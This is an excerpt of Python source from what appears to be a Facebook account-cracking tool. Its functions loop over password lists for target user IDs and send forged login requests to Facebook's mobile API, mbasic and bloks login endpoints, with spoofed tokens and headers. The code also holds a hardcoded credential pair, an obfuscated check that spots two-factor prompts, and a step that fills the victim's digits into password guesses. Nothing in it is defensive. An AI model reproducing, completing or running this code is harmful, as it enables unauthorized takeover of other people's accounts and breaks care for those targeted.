...
def bapi(uid, name, pwx, tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            'try_num': '1',
            'email': "61574312894171",
            'password':f'#PWD_FB4A:0:{int(time.time())}:{"sumon@12M"}',
            'method': 'auth.login',
            'generate_session_cookies': '1',
...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'lgnrnd': '010542_geoh',
            'lgnjs': '1787645142',
            'shared_prefs_data': '',
            'email': uid,
            'prefill_contact_point': '6297287419|6297287419',
            ...
            'ab_test_data': 'AfAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAA///A//ABAAD',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
            headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdafword%2F&lwv=120&lwc=1348028',
            ...
            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdafword%2F&lwv=120&lwc=1348131'
...
def d(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'm_pixel_ratio': '2.75',
            'wd': '393x895',
            'fr': '0XTsREhmKhj4STwyO..BqjWJR..AAA.0.0.BqjWJi.AWe6tnzE_NZzqAqODx6JF4UQypM'}
            data = {
    'aaid': '0',
    'user': '0',
    'a': '1',
    'req': '7',
    'hs': '20690.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '3',
    'ccg': 'EXCELLENT',
    'rev': '1045964573',
    's': 'ouh78p:2ym3tl:u9l6kq',
    'hsi': '7677901045145599761',
    ...
    'fb_dtsg': 'NAfwvxLXW58NhFRy_gvDGXvuRjkfZ3i12qf7ob9JQG1ocY40GJ4ChGA:0:0',
    'jazoest': '24863',
    'lsd': 'AdQdr_vgd4AGCLYXW7src_aFd7k',
    'jssesw': '11',
    'params': json.dumps({
        "params": json.dumps({
            "server_params": {
                "next_uri": "https://m.facebook.com/",
                "credential_type": "password",
                "username_text_input_id": "h1bxwg:55",
                "password_text_input_id": "h1bxwg:56",
                "login_source": "Login",
                "login_credential_type": "none",
                "server_login_source": "login",
                "ar_event_source": "login_home_page",
                ...
                "INTERNAL__latency_qpl_instance_id": "103016176000327",
                "device_id": None,
                "family_device_id": None,
                "waterfall_id": "521b7445-2462-4098-b124-159c89f3c354",
                "offline_experiment_group": None,
                "layered_homepage_experiment_group": None,
                "is_platform_login": 0,
                "is_from_logged_in_switcher": 0,
            ...
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=da3296cb34d354ba6ca7e2e1f147c00f24ef79dbeda8c17edc0864704ee696a1"
...
def cracker(uid, pwx, tl):
    ...
    try:
        ...
        for pw in pwx:
            ...
            pw = pw.replace("first8", first8digit)
